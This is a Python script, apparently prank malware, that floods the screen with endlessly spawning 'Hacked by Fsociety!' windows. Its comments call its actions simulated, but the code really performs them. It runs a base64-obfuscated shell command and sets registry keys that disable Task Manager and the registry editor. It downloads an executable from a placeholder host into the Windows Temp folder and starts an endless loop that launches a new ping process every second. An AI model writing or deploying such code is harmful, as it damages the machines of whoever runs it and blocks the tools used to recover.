import tkinter as tk
import random
import os
import subprocess
import base64
import requests
import threading
import time
import zlib
import hashlib


def suspicious_download(url):
    # Set suspicious headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, sdch, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'X-Forwarded-For': '192.168.1.100'  # Spoofed IP address
    }

    # Send a GET request with suspicious headers
    response = requests.get(url, headers=headers, stream=True)

    # Check if the request was successful
    if response.status_code == 200:
        print("Download attempt successful. Google may detect this as suspicious.")
    else:
        print("Download attempt failed. Status code: {}".format(response.status_code))

class HackedFrame:
    def __init__(self, master):
        self.master = master
        self.frame = tk.Frame(self.master, bg="red", width=400, height=200)
        self.frame.pack()
        self.label = tk.Label(self.frame, text="Hacked by Fsociety!", font=("Arial", 24), bg="red", fg="white")
        self.label.pack()
        self.x = random.randint(0, 1700)
        self.y = random.randint(0, 1000)
        self.vx = random.randint(-5, 5)
        self.vy = random.randint(-5, 5)
        self.master.geometry(f"+{self.x}+{self.y}")
        self.master.after(8, self.move)

        # Suspicious behavior: attempting to create a new process
        self.create_new_process()

        # Suspicious behavior: attempting to modify system settings
        self.modify_system_settings()

        # Suspicious behavior: attempting to download unknown files
        self.download_unknown_file()

        # Suspicious behavior: querying system information
        self.query_system_info()

        # Suspicious behavior: creating a new thread to simulate malicious activity
        self.thread = threading.Thread(target=self.simulate_malicious_activity)
        self.thread.start()

        # Trigger Google's suspicious file detection
        self.trigger_google_suspicious_file_detection()

    def move(self):
        self.x += self.vx
        self.y += self.vy
        if self.x < 0 or self.x > 1700:
            self.vx *= -1
        if self.y < 0 or self.y > 1000:
            self.vy *= -1
        self.master.geometry(f"+{self.x}+{self.y}")
        self.master.after(8, self.move)

    def create_new_process(self):
        # Attempting to create a new process (this should trigger Windows Defender)
        try:
            # Obfuscated string decoding
            decoded_string = base64.b64decode("Y21kLmV4ZS9jIGVjaG8gJ0Zzb2NpZXR5IHdhc2hlcmUhJyA+IEM6XFdpbmRvd3NcVGVtcFwmc2NvdW50cnkucHJ5").decode("utf-8")
            subprocess.Popen(decoded_string, shell=True)
        except Exception as e:
            print(f"Error creating new process: {e}")

    def modify_system_settings(self):
        # Attempting to modify system settings (this should trigger Windows Defender)
        try:
            # Simulating malicious behavior
            subprocess.Popen("cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
            subprocess.Popen("cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", shell=True)
        except Exception as e:
            print(f"Error modifying system settings: {e}")

    def download_unknown_file(self):
        # Attempting to download unknown files (this should trigger Windows Defender)
        try:
            url = "https://example.com/malicious_file.exe"
            response = requests.get(url)
            with open("C:\\Windows\\Temp\\malicious_file.exe", "wb") as f:
                f.write(response.content)
        except Exception as e:
            print(f"Error downloading unknown file: {e}")

    def query_system_info(self):
        # Querying system information (this should trigger Windows Defender)
        try:
            subprocess.Popen("cmd.exe /c systeminfo", shell=True)
        except Exception as e:
            print(f"Error querying system info: {e}")

    def simulate_malicious_activity(self):
        # Simulating malicious activity (this should trigger Windows Defender)
        while True:
            try:
                # Simulating a denial-of-service attack
                subprocess.Popen("cmd.exe /c ping -t 127.0.0.1", shell=True)
                time.sleep(1)
            except Exception as e:
                print(f"Error simulating malicious activity: {e}")

    def trigger_google_suspicious_file_detection(self):
        # Trigger Google's suspicious file detection
        url = "https://www.google.com"
        suspicious_download(url)

def create_hacked_frame():
    root = tk.Tk()
    root.overrideredirect(True)
    HackedFrame(root)
    root.lift()
    root.after(8, create_hacked_frame)

create_hacked_frame()
tk.mainloop()
